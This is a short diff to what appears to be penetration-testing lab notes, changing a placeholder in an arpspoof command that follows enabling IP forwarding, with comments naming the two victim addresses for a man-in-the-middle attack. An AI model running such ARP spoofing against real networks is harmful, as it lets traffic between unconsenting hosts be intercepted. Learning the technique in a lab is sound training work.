@@ -21,7 +21,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 And then, run arpspoof:
 
 ```
-arpspoof -i <interface> -t <target IP> -r <host IP>
+arpspoof -i <interface> -t $ip -r <host IP>
 # interface: NIC you want to use (like eth0 for your local LAN, or tap0 for Hera Lab)
 # target IP: one of the victim address
 # host IP: the other victim address.
